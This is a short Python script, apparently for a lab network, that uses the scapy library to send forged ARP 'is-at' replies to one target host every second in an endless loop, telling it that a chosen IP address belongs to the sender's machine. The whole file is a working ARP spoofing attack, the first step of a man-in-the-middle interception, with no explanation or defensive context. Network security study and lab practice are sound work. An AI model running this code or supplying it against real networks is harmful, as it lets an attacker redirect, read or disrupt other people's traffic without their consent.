from scapy.all import *
import time

endpointIP = "10.0.0.10"
targetIP = "10.0.0.9"
targetMAC = "14:dd:a9:91:1e:e2"

while True:
    sendp(Ether(dst=targetMAC)/ARP(op="is-at", psrc=endpointIP, pdst=targetIP))
    time.sleep(1)
